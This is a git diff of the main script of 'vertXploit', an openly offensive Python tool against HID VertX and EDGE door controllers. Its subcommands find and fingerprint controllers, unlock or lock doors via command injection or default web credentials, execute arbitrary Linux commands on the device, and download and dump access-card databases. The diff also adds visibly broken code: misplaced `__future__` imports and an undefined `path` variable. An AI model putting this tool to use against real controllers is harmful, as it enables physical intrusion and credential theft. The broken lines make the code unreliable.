@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# Copyright (c) 2016, Brandan Geise [coldfusion]
+# Copyright (c) 2017, Brandan Geise [coldfusion]
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -23,207 +23,174 @@ import os
 import re
 import tabulate
 
-from vertXploit.main import Actions
-from vertXploit.database import Database
-from vertXploit.helpers import Helpers
+from __future__ import print_function
+from __future__ import unicode_literals
 
-utils = Helpers()
+from vertXploit.actions import Actions
+from vertXploit.database import Database
+from vertXploit.discover import Discover
 
 
 def main():
-	parser = argparse.ArgumentParser(prog='vertXploit.py', description='Exploit HID VertX and EDGE door controllers through command injection or the web interface.', usage='./vertXploit.py [discover, fingerprint, unlock, lock, raw, download, dump] [-h]')
-	subparsers = parser.add_subparsers(dest='action', help='Action to perform on controller')
+	parser = argparse.ArgumentParser(description='Exploit HID VertX and EDGE door access controllers.', usage='vertXploit.py [discover, fingerprint, unlock, lock, raw, download, dump] [-h]')
+	subparsers = parser.add_subparsers(title='Actions', dest='action', help='Action to perform on the controller', metavar='{discover, fingerprint, unlock, lock, raw, download, dump}')
 
-	discover_parser = subparsers.add_parser('discover', help='Discover controllers', usage='./vertXploit.py discover --ip IP')
-	discover_parser.add_argument('--ip', dest='ip', help='Controller IP address (default: 255.255.255.255)', default='255.255.255.255')
+	discover_parser = subparsers.add_parser('discover', help='Find controllers on the network', usage='vertXploit.py discover --ip IP')
+	discover_parser.add_argument('--ip', dest='ip', help='IP address or CIDR range (default: 255.255.255.255)', default='255.255.255.255', metavar='IP')
 
-	fingerprint_parser = subparsers.add_parser('fingerprint', help='Fingerprint controller', usage='./vertXploit.py fingerprint IP')
-	fingerprint_parser.add_argument('ip', help='Controller IP address')
+	fingerprint_parser = subparsers.add_parser('fingerprint', help='Return information about the controller', usage='vertXploit.py fingerprint IP')
+	fingerprint_parser.add_argument('ip', help='Controller IP address', metavar='IP')
 
-	unlock_parser = subparsers.add_parser('unlock', help='Unlock doors', usage='./vertXploit.py unlock IP --username USERNAME --password PASSWORD')
-	unlock_parser.add_argument('ip', help='Controller IP address')
-	unlock_parser.add_argument('--username', help='Web interface username, (default: root)', default='root')
-	unlock_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass')
+	unlock_parser = subparsers.add_parser('unlock', help='Unlock doors connected to the controller', usage='vertXploit.py unlock IP --username USERNAME --password PASSWORD')
+	unlock_parser.add_argument('ip', help='Controller IP address', metavar='IP')
+	unlock_parser.add_argument('--username', help='Web interface username, (default: root)', default='root', metavar='USERNAME')
+	unlock_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass', metavar='PASSWORD')
 
-	lock_parser = subparsers.add_parser('lock', help='Lock doors', usage='./vertXploit.py lock IP --username USERNAME --password PASSWORD')
-	lock_parser.add_argument('ip', help='Controller IP address')
-	lock_parser.add_argument('--username', help='Web interface username, (default: root)', default='root')
-	lock_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass')
+	lock_parser = subparsers.add_parser('lock', help='Lock doors connected to the controller', usage='vertXploit.py lock IP --username USERNAME --password PASSWORD')
+	lock_parser.add_argument('ip', help='Controller IP address', metavar='IP')
+	lock_parser.add_argument('--username', help='Web interface username, (default: root)', default='root', metavar='USERNAME')
+	lock_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass', metavar='PASSWORD')
 
-	raw_parser = subparsers.add_parser('raw', help='Send raw Linux command', usage='./vertXploit.py raw IP COMMAND')
-	raw_parser.add_argument('ip', help='Controller IP address')
-	raw_parser.add_argument('command', help='Linux command, (example: ping -c 5 IP)', nargs='+')
+	raw_parser = subparsers.add_parser('raw', help='Execute a Linux command on the controller', usage='vertXploit.py raw IP COMMAND')
+	raw_parser.add_argument('ip', help='Controller IP address', metavar='IP')
+	raw_parser.add_argument('command', help='Linux command, (example: ping -c 5 IP)', metavar='COMMAND')
 
-	download_parser = subparsers.add_parser('download', help='Download card databases', usage='./vertXploit.py download IP --username USERNAME --password PASSWORD')
-	download_parser.add_argument('ip', help='Controller IP address')
-	download_parser.add_argument('--username', help='Web interface username, (default: root)', default='root')
-	download_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass')
+	download_parser = subparsers.add_parser('download', help='Download databases from the controller', usage='vertXploit.py download IP --username USERNAME --password PASSWORD')
+	download_parser.add_argument('ip', help='Controller IP address', metavar='IP')
+	download_parser.add_argument('--username', help='Web interface username, (default: root)', default='root', metavar='USERNAME')
+	download_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass', metavar='PASSWORD')
 
-	dump_parser = subparsers.add_parser('dump', help='Dump card values from databases', usage='./vertXploit.py dump --path PATH')
-	dump_parser.add_argument('--path', help='Path to database files', default='.')
+	dump_parser = subparsers.add_parser('dump', help='Parse card values from the downloaded databases', usage='vertXploit.py dump --path PATH')
+	dump_parser.add_argument('--path', help='Path to database files', default=os.getcwd(), metavar='PATH')
 
 	args = parser.parse_args()
 
+	# Discover
 	if args.action == 'discover':
-		discover(args.ip)
+		vertx = Discover(args.ip)
+		if re.match(r'(^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$)', args.ip):
+			print_status("Starting Nmap scan on {0} subnet".format(args.ip))
+			controllers = vertx.scan()
+		else:
+			print_status("Sending discovery request to {0}".format(args.ip))
+			controllers = vertx.broadcast()
+
+		if len(controllers) > 0:
+			print_good('VertX Controllers Identified')
+			print(tabulate.tabulate(controllers, headers=['IP', 'Port', 'MAC'], tablefmt='psql', stralign='center', numalign='center'))
+		else:
+			print_warn('No VertX controllers found')
+
+	# Fingerprint
 	elif args.action == 'fingerprint':
-		fingerprint(args.ip)
+		print_status("Fingerprinting {0}".format(args.ip))
+		vertx_info = Actions(args.ip).fingerprint()
+		if None not in vertx_info.values():
+			print_good('VertX Controller Information')
+			print("RAW: {0}".format(vertx_info['raw']))
+			print("Name: {0}".format(vertx_info['name']))
+			print("Model: {0}".format(vertx_info['model']))
+			print("Version: {0} - ({1})".format(vertx_info['version'], vertx_info['data']))
+			print("IP Address: {0}".format(vertx_info['ip']))
+			print("MAC Address: {0}".format(vertx_info['mac']))
+
+			if vertx_info['vulnerable']:
+				print("Vulnerable: \033[1m\033[32mTrue\033[0m")
+			else:
+				print("Vulnerable: \033[1m\033[33mFalse\033[0m")
+		else:
+			print_warn('Device might not be a VertX controller')
+
+	# Unlock
 	elif args.action == 'unlock':
-		unlock(args.ip, args.username, args.password)
-	elif args.action == 'lock':
-		lock(args.ip, args.username, args.password)
-	elif args.action == 'raw':
-		raw(args.ip, args.username, args.password, ''.join(args.command))
-	elif args.action == 'download':
-		download(args.ip, args.username, args.password)
-	else:
-		dump(args.path)
-
-
-# Discover
-def discover(ip):
-	vertx = Actions(ip)
-	if ip == '255.255.255.255':
-		utils.print_status('Sending discovery request to local broadcast network')
-	else:
-		utils.print_status('Starting Nmap scan on local subnet')
-
-	controllers = vertx.discover()
-
-	if len(controllers) > 0:
-		utils.print_good('VertX controllers found:')
-		print(tabulate.tabulate(controllers, headers=['IP', 'Port', 'MAC'], tablefmt='psql', stralign='center', numalign='center'))
-	else:
-		utils.print_warn('No VertX controllers found')
-
-
-# Fingerprint
-def fingerprint(ip):
-	utils.print_status("Sending discovery request to {0}".format(ip))
-	vertx = Actions(ip)
-	vertx_info = vertx.fingerprint()
-	if None not in vertx_info.values():
-		utils.print_good("VertX Controller Information")
-		print("RAW: {0}".format(vertx_info['raw']))
-		print("Name: {0}".format(vertx_info['name']))
-		print("Model: {0}".format(vertx_info['model']))
-		print("Version: {0} - ({1})".format(vertx_info['version'], vertx_info['data']))
-		print("Internal IP Address: {0}".format(vertx_info['internal_ip']))
-		print("External IP Address: {0}".format(vertx_info['external_ip']))
-		print("MAC Address: {0}".format(vertx_info['mac']))
-
-		if vertx_info['vulnerable']:
-			print("Vulnerable: \033[1m\033[32mTrue\033[0m")
+		vertx = Actions(args.ip, args.username, args.password)
+		if vertx.vertx_info['vulnerable']:
+			print_status('Unlocking doors using command injection')
 		else:
-			print("Vulnerable: \033[1m\033[33mFalse\033[0m")
-	else:
-		utils.print_warn('VertX controller did not responded to the discovery request')
+			print_status('Unlocking doors through the web interface')
 
-
-# Unlock
-def unlock(ip, username, password):
-	vertx = Actions(ip)
-	vertx_info = vertx.fingerprint()
-	if vertx_info['vulnerable']:
-		utils.print_status('Unlocking doors using command injection')
 		response = vertx.unlock()
-		if response[0].split(';')[0] == 'ack':
-			utils.print_good('Door successfully unlocked')
+		if response:
+			print_good('Door successfully unlocked')
+		elif response is False:
+			print_warn('Door unlock failed')
 		else:
-			utils.print_warn('Door unlock failed')
-	else:
-		utils.print_status('Unlocking doors through the web interface')
-		response = vertx.web_unlock(username, password)
-		if response is False:
-			utils.print_warn('Door unlock failed, bad credentials')
-		elif response is None:
-			utils.print_error('VertX controller did not respond')
+			print_error('Door unlock failed, bad credentials')
+
+	# Lock
+	elif args.action == 'lock':
+		vertx = Actions(args.ip, args.username, args.password)
+		if vertx.vertx_info['vulnerable']:
+			print_status('Locking doors using command injection')
 		else:
-			if (response['text']).split(';')[1] == ';-1504;':
-				utils.print_good('Door successfully unlocked')
-			elif (response['text']).split(';')[1] == ';0;':
-				utils.print_warn('Door unlock failed')
-			else:
-				utils.print_error('VertX controller returned an unknown response')
-				print(response)
+			print_status('Locking doors through the web interface')
 
-
-# Lock
-def lock(ip, username, password):
-	vertx = Actions(ip)
-	vertx_info = vertx.fingerprint()
-	if vertx_info['vulnerable']:
-		utils.print_status('Locking doors using command injection')
 		response = vertx.lock()
-		if response[0].split(';')[0] == 'ack':
-			utils.print_good('Door successfully locked')
+		if response:
+			print_good('Door successfully locked')
+		elif response is False:
+			print_warn('Door lock failed')
 		else:
-			utils.print_warn('Door lock failed')
-	else:
-		utils.print_status('Locking doors through the web interface')
-		response = vertx.web_lock(username, password)
-		if response is False:
-			utils.print_warn('Door lock failed, bad credentials')
-		elif response is None:
-			utils.print_error('VertX controller did not respond')
-		else:
-			if (response['text']).split(';')[1] == ';-1504;':
-				utils.print_good('Door successfully locked')
-			elif (response['text']).split(';')[1] == ';0;':
-				utils.print_warn('Door lock failed')
+			print_error('Door lock failed, bad credentials')
+
+	# Raw
+	elif args.action == 'raw':
+		vertx = Actions(args.ip)
+		if vertx.vertx_info['vulnerable']:
+			print_status('Sending raw payload')
+			response = vertx.raw(args.command)
+			if response:
+				print_good('Command sent successfully')
 			else:
-				utils.print_error('VertX controller returned an unknown response')
-				print(response)
-
-
-# Raw
-def raw(ip, username, password, command):
-	if len(command) > 41:
-		utils.print_error('Command is too long to send in one request')
-	else:
-		vertx = Actions(ip, username, password)
-		vertx_info = vertx.fingerprint()
-		if vertx_info['vulnerable']:
-			utils.print_status('Sending raw payload')
-			response = vertx.raw(command)
-			if response[0].split(';')[0] == 'ack':
-				utils.print_good('Payload sent successfully')
-			else:
-				utils.print_error('Failed to send payload')
+				print_error('Command injection failed')
 		else:
-			utils.print_error('VertX controller is not vulnerable to command injection')
+			print_error('VertX controller is not vulnerable to command injection')
 
-
-# Download
-def download(ip, username, password):
-	vertx = Actions(ip)
-	vertx_info = vertx.fingerprint()
-	if vertx_info['vulnerable']:
-		utils.print_status('Downloading VertX databases')
-		database_responses = vertx.download(username, password)
-		for database in database_responses:
-			if database_responses[database]:
-				utils.print_good("Successfully downloaded {0}".format(database))
-			elif database_responses[database] is False:
-				utils.print_warn('Download failed, bad username or password')
-				break
-			else:
-				utils.print_error("Unable to find database at http://{0}/{1}".format(ip, database))
-	else:
-		utils.print_error('VertX controller is not vulnerable to command injection')
-
-
-# Dump
-def dump(path):
-	if os.path.isfile("{0}/IdentDB".format(path)) and os.path.isfile("{0}/AccessDB".format(path)):
-		utils.print_status('Processing card information from VertX databases')
-		card_data = Database(path).dump()
-		if len(card_data) > 0:
-			print(tabulate.tabulate(card_data, headers=['DB ID', 'Card ID', 'Door', 'Enabled'], tablefmt='psql', stralign='center', numalign='center'))
+	# Download
+	elif args.action == 'download':
+		vertx = Actions(args.ip, args.username, args.password)
+		if vertx.vertx_info['vulnerable']:
+			print_status('Downloading VertX databases')
+			databases = vertx.download()
+			for database in databases:
+				if databases[database]:
+					print_good('Successfully downloaded {0}'.format(database))
+				elif databases[database] is False:
+					print_warn('Download failed, bad username or password')
+					break
+				else:
+					print_error("Unable to find database at http://{0}/{1}".format(args.ip, database))
 		else:
-			utils.print_warn('No card data in database')
+			print_error('VertX controller is not vulnerable to command injection')
+
+	# Dump
 	else:
-		utils.print_error("Could not find IdentDB or AccessDB in {0}/".format(os.path.abspath(path)))
+		if os.path.isfile("{0}/IdentDB".format(args.path)) and os.path.isfile("{0}/AccessDB".format(args.path)):
+			print_status('Processing card information from VertX databases')
+			card_data = Database(args.path).dump()
+			if len(card_data) > 0:
+				print(tabulate.tabulate(card_data, headers=['DB ID', 'Card ID', 'Door', 'Enabled'], tablefmt='psql', stralign='center', numalign='center'))
+			else:
+				print_warn('No card data in database')
+		else:
+			print_error("Could not find IdentDB or AccessDB in {0}/".format(os.path.abspath(path)))
+
+
+def print_status(message):
+	print("\033[1m\033[34m[*]\033[0m {0}".format(message))
+
+
+def print_good(message):
+	print("\033[1m\033[32m[+]\033[0m {0}".format(message))
+
+
+def print_warn(message):
+	print("\033[1m\033[33m[!]\033[0m {0}".format(message))
+
+
+def print_error(message):
+	print("\033[1m\033[31m[-]\033[0m {0}".format(message))
+
 
 if __name__ == '__main__':
 	main()
